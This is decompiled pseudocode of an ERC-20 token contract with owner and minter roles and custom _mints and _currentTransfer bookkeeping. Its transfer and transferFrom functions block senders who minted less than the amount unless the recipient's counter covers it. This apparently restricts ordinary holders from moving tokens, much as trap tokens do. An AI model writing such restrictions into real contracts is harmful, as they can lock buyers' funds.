contract main {




// =====================  Runtime code  =====================


array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address owner; offset 8
address minterAddress;
mapping of uint256 _balances;
mapping of uint256 _mints;
mapping of uint256 _allowances;
mapping of uint256 _currentTransfer;
uint256 totalSupply;

function _allowances(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return _allowances[arg1][arg2]
}

function name() payable {
    return name[0 len name.length]
}

function minter() payable {
    return minterAddress
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function _balances(address arg1) payable {
    require calldata.size - 4 >= 32
    return _balances[arg1]
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return _balances[address(arg1)]
}

function owner() payable {
    return owner
}

function _mints(address arg1) payable {
    require calldata.size - 4 >= 32
    return _mints[arg1]
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function _currentTransfer(address arg1) payable {
    require calldata.size - 4 >= 32
    return _currentTransfer[arg1]
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return _allowances[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function setMinter(address arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    minterAddress = arg1
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0xfe4f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function mint(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if minterAddress != msg.sender:
        revert with 0, '!minter'
    if totalSupply + arg2 < totalSupply:
        revert with 0, 'SafeMath: addition overflow'
    totalSupply += arg2
    if _balances[address(arg1)] + arg2 < _balances[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    _balances[address(arg1)] += arg2
    if _mints[address(arg1)] + arg2 < _mints[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    _mints[address(arg1)] += arg2
    emit Mint(arg2, 0, arg1);
    emit Transfer(arg2, 0, arg1);
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    _allowances[address(msg.sender)][address(arg1)] = arg2
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if _mints[address(msg.sender)] < arg2:
        if _currentTransfer[address(arg1)] < arg2:
            revert with 0, 'ERC20: you mint not enough'
    if arg1 == minterAddress:
        if arg2 > _mints[address(msg.sender)]:
            revert with 0, 'SafeMath: subtraction overflow'
        _mints[address(msg.sender)] -= arg2
    else:
        if _mints[address(msg.sender)] > 0:
            if _currentTransfer[address(msg.sender)] + arg2 < _currentTransfer[address(msg.sender)]:
                revert with 0, 'SafeMath: addition overflow'
            _currentTransfer[address(msg.sender)] += arg2
        if _mints[address(arg1)] > 0:
            if arg2 > _currentTransfer[address(arg1)]:
                revert with 0, 'SafeMath: subtraction overflow'
            _currentTransfer[address(arg1)] -= arg2
    if arg2 > _balances[address(msg.sender)]:
        revert with 0, 'SafeMath: subtraction overflow'
    _balances[address(msg.sender)] -= arg2
    if _balances[address(arg1)] + arg2 < _balances[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    _balances[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if arg3 > _allowances[address(arg1)][address(msg.sender)]:
        revert with 0, 'SafeMath: subtraction overflow'
    _allowances[address(arg1)][address(msg.sender)] -= arg3
    if _mints[address(arg1)] < arg3:
        if _currentTransfer[address(arg2)] < arg3:
            revert with 0, 'ERC20: you mint not enough'
    if arg2 == minterAddress:
        if arg3 > _mints[address(arg1)]:
            revert with 0, 'SafeMath: subtraction overflow'
        _mints[address(arg1)] -= arg3
    else:
        if _mints[address(arg1)] > 0:
            if _currentTransfer[address(arg1)] + arg3 < _currentTransfer[address(arg1)]:
                revert with 0, 'SafeMath: addition overflow'
            _currentTransfer[address(arg1)] += arg3
        if _mints[address(arg2)] > 0:
            if arg3 > _currentTransfer[address(arg2)]:
                revert with 0, 'SafeMath: subtraction overflow'
            _currentTransfer[address(arg2)] -= arg3
    if arg3 > _balances[address(arg1)]:
        revert with 0, 'SafeMath: subtraction overflow'
    _balances[address(arg1)] -= arg3
    if _balances[address(arg2)] + arg3 < _balances[address(arg2)]:
        revert with 0, 'SafeMath: addition overflow'
    _balances[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}



}
